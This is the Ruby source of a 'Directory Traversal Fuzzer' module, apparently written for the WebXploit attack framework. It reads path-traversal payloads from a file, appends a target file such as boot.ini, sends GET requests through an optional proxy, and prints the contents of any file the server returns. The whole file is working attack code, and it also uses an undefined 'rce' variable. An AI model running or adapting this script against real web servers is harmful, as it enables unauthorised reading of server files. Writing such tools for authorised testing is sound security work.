

class WebXploit <  WXf::WXfmod_Factory::Auxiliary

 
	include WXf::WXfassists::General::MechReq 
   
  
	def initialize
    		super( 
    'Name'        => 'Directory Traversal Fuzzer',
    'Version'     => '1.0',
    'Description' => %q{
    This modules fuzzes various directory traversal payloads against the
    specified URLs
                        },
    'References'  =>
     [
        [ 'URL', 'http://carnal0wnage.attackresearch.com/' ],
        [ 'URL', 'http://www.owasp.org/index.php/Testing_for_Path_Traversal']  
     ],
    'Author'      => [ 'CG' ],
    'License'     => WXF_LICENSE
)
			init_opts([
				OptString.new('FILE',     [true, 'File To View', 'boot.ini']),
				OptString.new('LFILE', [true, 'Directory Traversal Strings File','dir_traversal_strings.txt']),
        			])
	end

	def run
  
		
		file =  datahash['FILE']
		fuzzfile = datahash['LFILE']
    
		begin
   
			check = File.open(fuzzfile)
			check.each do |fuzztrav| 
				string = fuzztrav.strip+file
				
		
				
				begin
				res = mech_req({
				          'method'=> 'GET',
          				'RURL'  =>  "#{rurl}#{string}",
          				'PROXY_ADDR' => proxya,
          				'PROXY_PORT' => proxyp,
							})
							
				
				 

				   
     		 if (res.nil?)
				
							print_error("No response for #{rurl}#{string}")
     		 end	
     				
     		 if	 (res) and (res.respond_to?('code'))  and (res.code == '200')
      					     print_status("#{string}")
     		             print_status("Output Of Requested File:\n#{res.body}")
     		       
     			      
     			end
				
          if (rce) 
     			
            print_status("Received #{rce} for #{string}")
            
          end
          
            
				  end
			
				  
				  
			end
  
 

end
end    
end
